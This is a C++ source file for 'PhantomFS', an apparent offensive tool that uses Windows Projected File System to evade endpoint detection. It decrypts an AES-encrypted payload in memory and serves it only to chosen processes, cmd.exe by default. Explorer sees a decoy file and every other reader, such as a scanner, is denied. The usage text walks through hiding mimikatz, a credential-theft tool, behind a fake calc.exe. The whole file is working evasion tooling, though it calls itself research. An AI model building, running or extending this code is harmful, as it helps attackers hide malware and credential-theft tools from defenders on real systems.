#include <Windows.h>
#include <objbase.h>
#include <cstdio>
#include <string>
#include <vector>
#include "Config.h"
#include "FileUtils.h"
#include "Crypto.h"
#include "PhantomProvider.h"

static void PrintBanner() {
    wprintf(L"\n");
    wprintf(L"  PhantomFS - ProjFS EDR Evasion Research\n");
    wprintf(L"  AES-256-CBC encrypted payload projection\n");
    wprintf(L"\n");
}

static void PrintUsage(const wchar_t* exe) {
    wprintf(L"Usage:\n\n");
    wprintf(L"  SERVE MODE (project files with per-process content switching):\n");
    wprintf(L"    %s <root_dir> -file <payload.enc> -key <hex_key> -decoy <decoy.exe>\n", exe);
    wprintf(L"                   [-name <virtual_name>] [-payload-to <proc>] [-decoy-to <proc>]\n");
    wprintf(L"                   [-allow-read <proc>] [-quiet]\n\n");
    wprintf(L"  Options:\n");
    wprintf(L"    -file <path>        AES-256 encrypted payload file\n");
    wprintf(L"    -key <hex>          64-char hex key (32 bytes)\n");
    wprintf(L"    -decoy <path>       Benign file served to allowed non-payload processes\n");
    wprintf(L"    -name <n>           Virtual filename in root (default: decoy filename)\n");
    wprintf(L"    -payload-to <proc>  Process substring that gets PAYLOAD (repeatable)\n");
    wprintf(L"    -decoy-to <proc>    Process substring that gets DECOY (repeatable)\n");
    wprintf(L"    -quiet              Disable verbose logging\n\n");
    wprintf(L"  DEFAULT BEHAVIOR:\n");
    wprintf(L"    All processes are DENIED by default.\n");
    wprintf(L"    Only processes matching -payload-to receive PAYLOAD content.\n");
    wprintf(L"    Only processes matching -decoy-to receive DECOY content.\n\n");
    wprintf(L"  ENCRYPT MODE (prepare encrypted payload):\n");
    wprintf(L"    %s -encrypt <input_file> -key <hex_key> -out <output.enc>\n\n", exe);
    wprintf(L"  KEYGEN MODE (generate random 256-bit key):\n");
    wprintf(L"    %s -keygen\n\n", exe);
    wprintf(L"Example workflow:\n");
    wprintf(L"  1) %s -keygen\n", exe);
    wprintf(L"     -> prints random hex key\n\n");
    wprintf(L"  2) %s -encrypt mimikatz.exe -key <key> -out mimikatz.enc\n", exe);
    wprintf(L"     -> AES encrypts mimikatz.exe\n\n");
    wprintf(L"  3) %s C:\\Staging -file mimikatz.enc -key <key> -decoy calc.exe\n", exe);
    wprintf(L"     -> Projects calc.exe in C:\\Staging\\\n");
    wprintf(L"     -> cmd.exe reads:      payload bytes\n");
    wprintf(L"     -> explorer.exe reads:  decoy bytes\n");
    wprintf(L"     -> everything else:     ACCESS DENIED\n\n");
    wprintf(L"Prereq: Enable-WindowsOptionalFeature -Online -FeatureName Client-ProjFS -NoRestart\n\n");
}

// ---------------------------------------------------------------------------
// Keygen mode
// ---------------------------------------------------------------------------

static int DoKeygen() {
    BYTE key[32];
    BCryptGenRandom(nullptr, key, 32, BCRYPT_USE_SYSTEM_PREFERRED_RNG);
    wprintf(L"[+] Generated AES-256 key:\n    ");
    for (int i = 0; i < 32; i++) wprintf(L"%02x", key[i]);
    wprintf(L"\n\n");
    SecureZeroMemory(key, sizeof(key));
    return 0;
}

// ---------------------------------------------------------------------------
// Encrypt mode
// ---------------------------------------------------------------------------

static int DoEncrypt(int argc, wchar_t* argv[]) {
    std::wstring inputPath, keyHex, outputPath;

    int i = 1;
    while (i < argc) {
        std::wstring arg = argv[i];
        if (arg == L"-encrypt" && (i + 1) < argc) {
            inputPath = argv[++i];
        }
        else if (arg == L"-key" && (i + 1) < argc) {
            keyHex = argv[++i];
        }
        else if (arg == L"-out" && (i + 1) < argc) {
            outputPath = argv[++i];
        }
        i++;
    }

    if (inputPath.empty() || keyHex.empty() || outputPath.empty()) {
        wprintf(L"[!] -encrypt requires -key and -out\n");
        return 1;
    }

    if (keyHex.size() != 64) {
        wprintf(L"[!] Key must be 64 hex chars (32 bytes). Got %zu chars.\n", keyHex.size());
        return 1;
    }

    auto keyBytes = Crypto::HexToBytes(keyHex);
    if (keyBytes.size() != 32) {
        wprintf(L"[!] Invalid hex key\n");
        return 1;
    }

    wprintf(L"[*] Reading: %s\n", inputPath.c_str());
    auto plainData = FileUtils::ReadFileBytes(inputPath);
    if (plainData.empty()) {
        wprintf(L"[!] Failed to read input file\n");
        return 1;
    }
    wprintf(L"[+] Read %zu bytes\n", plainData.size());

    wprintf(L"[*] Encrypting with AES-256-CBC...\n");
    auto encData = Crypto::AesEncrypt(plainData, keyBytes);
    if (encData.empty()) {
        wprintf(L"[!] Encryption failed\n");
        return 1;
    }

    if (!FileUtils::WriteFileBytes(outputPath, encData)) {
        wprintf(L"[!] Failed to write: %s\n", outputPath.c_str());
        return 1;
    }

    wprintf(L"[+] Encrypted %zu -> %zu bytes\n", plainData.size(), encData.size());
    wprintf(L"[+] Written to: %s\n", outputPath.c_str());

    SecureZeroMemory(plainData.data(), plainData.size());
    SecureZeroMemory(keyBytes.data(), keyBytes.size());
    return 0;
}

// ---------------------------------------------------------------------------
// Serve mode
// ---------------------------------------------------------------------------

static int DoServe(int argc, wchar_t* argv[]) {
    std::wstring rootDir = argv[1];
    std::wstring encPayloadPath, keyHex, decoyPath, virtualName;
    PhantomConfig config;
    config.Verbose = true;
    bool hasCustomRules = false;

    int i = 2;
    while (i < argc) {
        std::wstring arg = argv[i];

        if (arg == L"-file" && (i + 1) < argc) {
            encPayloadPath = argv[++i];
        }
        else if (arg == L"-key" && (i + 1) < argc) {
            keyHex = argv[++i];
        }
        else if (arg == L"-decoy" && (i + 1) < argc) {
            decoyPath = argv[++i];
        }
        else if (arg == L"-name" && (i + 1) < argc) {
            virtualName = argv[++i];
        }
        else if (arg == L"-payload-to" && (i + 1) < argc) {
            hasCustomRules = true;
            config.Rules.push_back({ argv[++i], ProcessPolicy::SERVE_PAYLOAD, true, true });
        }
        else if (arg == L"-decoy-to" && (i + 1) < argc) {
            hasCustomRules = true;
            config.Rules.push_back({ argv[++i], ProcessPolicy::SERVE_DECOY, true, true });
        }
        else if (arg == L"-quiet") {
            config.Verbose = false;
        }
        else {
            wprintf(L"[!] Unknown argument: %s\n", argv[i]);
            PrintUsage(argv[0]);
            return 1;
        }
        i++;
    }

    if (encPayloadPath.empty() || keyHex.empty() || decoyPath.empty()) {
        wprintf(L"[!] Serve mode requires: -file, -key, -decoy\n\n");
        PrintUsage(argv[0]);
        return 1;
    }

    if (keyHex.size() != 64) {
        wprintf(L"[!] Key must be 64 hex chars (32 bytes). Got %zu chars.\n", keyHex.size());
        return 1;
    }

    // Default rules: only cmd.exe gets payload, explorer gets decoy,
    // everything else is denied by default policy.
    if (!hasCustomRules) {
        config.Rules.push_back({ L"cmd.exe", ProcessPolicy::SERVE_PAYLOAD, true, true });
        config.Rules.push_back({ L"explorer.exe", ProcessPolicy::SERVE_DECOY, true, true });
    }    

    auto keyBytes = Crypto::HexToBytes(keyHex);
    if (keyBytes.size() != 32) {
        wprintf(L"[!] Invalid hex key\n");
        return 1;
    }

    wprintf(L"[*] Loading encrypted payload: %s\n", encPayloadPath.c_str());
    auto encData = FileUtils::ReadFileBytes(encPayloadPath);
    if (encData.empty()) {
        wprintf(L"[!] Failed to read encrypted payload\n");
        return 1;
    }

    wprintf(L"[*] Decrypting AES-256-CBC (%zu bytes)...\n", encData.size());
    auto payloadData = Crypto::AesDecrypt(encData, keyBytes);
    if (payloadData.empty()) {
        wprintf(L"[!] Decryption failed. Wrong key or corrupted file?\n");
        return 1;
    }
    wprintf(L"[+] Decrypted payload: %zu bytes\n", payloadData.size());

    SecureZeroMemory(encData.data(), encData.size());
    SecureZeroMemory(keyBytes.data(), keyBytes.size());

    wprintf(L"[*] Loading decoy: %s\n", decoyPath.c_str());
    auto decoyData = FileUtils::ReadFileBytes(decoyPath);
    if (decoyData.empty()) {
        wprintf(L"[!] Failed to read decoy file\n");
        SecureZeroMemory(payloadData.data(), payloadData.size());
        return 1;
    }
    wprintf(L"[+] Decoy loaded: %zu bytes\n", decoyData.size());

    if (virtualName.empty()) {
        size_t pos = decoyPath.find_last_of(L"\\/");
        virtualName = (pos != std::wstring::npos) ? decoyPath.substr(pos + 1) : decoyPath;
    }

    ProjectedFileEntry entry;
    entry.FileName = virtualName;
    entry.PayloadData = std::move(payloadData);
    entry.DecoyData = std::move(decoyData);
    config.Files.push_back(std::move(entry));

    wprintf(L"\n[*] Configuration:\n");
    wprintf(L"    Root dir:     %s\n", rootDir.c_str());
    wprintf(L"    Virtual file: %s\n", virtualName.c_str());
    wprintf(L"    Payload:      %zu bytes (decrypted in memory)\n", config.Files[0].PayloadData.size());
    wprintf(L"    Decoy:        %zu bytes (from %s)\n", config.Files[0].DecoyData.size(), decoyPath.c_str());
    wprintf(L"    Default:      DENY_READ to all unlisted processes\n");
    wprintf(L"    Rules:\n");
    for (const auto& r : config.Rules) {
        const char* ps = "DENY";
        if (r.ReadPolicy == ProcessPolicy::SERVE_PAYLOAD) ps = "PAYLOAD";
        else if (r.ReadPolicy == ProcessPolicy::SERVE_DECOY) ps = "DECOY";
        wprintf(L"      %s -> %hs\n", r.ImageNameSubstring.c_str(), ps);
    }
    wprintf(L"\n");

    PhantomProvider provider(std::move(config));

    HRESULT hr = provider.Init(rootDir.c_str());
    if (FAILED(hr)) {
        wprintf(L"[!] Init failed: 0x%08X\n", hr);
        wprintf(L"    Ensure ProjFS is enabled:\n");
        wprintf(L"    Enable-WindowsOptionalFeature -Online -FeatureName Client-ProjFS -NoRestart\n");
        return 1;
    }

    hr = provider.Start();
    if (FAILED(hr)) {
        wprintf(L"[!] Start failed: 0x%08X\n", hr);
        return 1;
    }

    wprintf(L"[+] PhantomFS active. Press ENTER to stop...\n\n");
    char buf[4];
    gets_s(buf);

    provider.Stop();
    wprintf(L"[+] Done.\n");
    return 0;
}

// ---------------------------------------------------------------------------
// Entry
// ---------------------------------------------------------------------------

int wmain(int argc, wchar_t* argv[]) {
    PrintBanner();

    if (argc < 2) {
        PrintUsage(argv[0]);
        return 1;
    }

    std::wstring first = argv[1];

    if (first == L"-h" || first == L"--help" || first == L"/?") {
        PrintUsage(argv[0]);
        return 0;
    }

    if (first == L"-keygen") {
        return DoKeygen();
    }

    if (first == L"-encrypt") {
        return DoEncrypt(argc, argv);
    }

    return DoServe(argc, argv);
}